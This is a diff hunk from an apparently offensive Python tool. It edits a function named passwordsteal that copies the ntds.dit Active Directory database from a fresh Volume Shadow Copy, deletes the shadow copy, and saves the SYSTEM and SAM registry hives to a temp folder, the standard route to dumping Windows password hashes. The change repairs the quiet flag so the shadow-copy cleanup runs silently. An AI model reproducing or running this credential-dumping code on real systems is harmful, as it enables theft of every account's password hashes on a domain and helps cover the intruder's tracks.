@@ -30,7 +30,7 @@ def passwordsteal():
     proc = subprocess.getoutput("vssadmin create shadow /for=C:")
     proc = proc.split(":")
     os.system("copy " + proc[3] + "\\Windows\\Ntds\\ntds.dit C:\\Windows\\Temp")
-    os.system("vssadmin delete shadows /shadow=" + proc[2].split(" ")[1].strip("\n") + "\quiet")
+    os.system("vssadmin delete shadows /shadow=" + proc[2].split(" ")[1].strip("\n") + " /quiet")
     subprocess.run("reg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM /y")
     subprocess.run("reg save HKLM\\SAM C:\\Windows\\Temp\\SAM /y")
     ntdsfile = "\\Windows\\Temp\\ntds.dit"
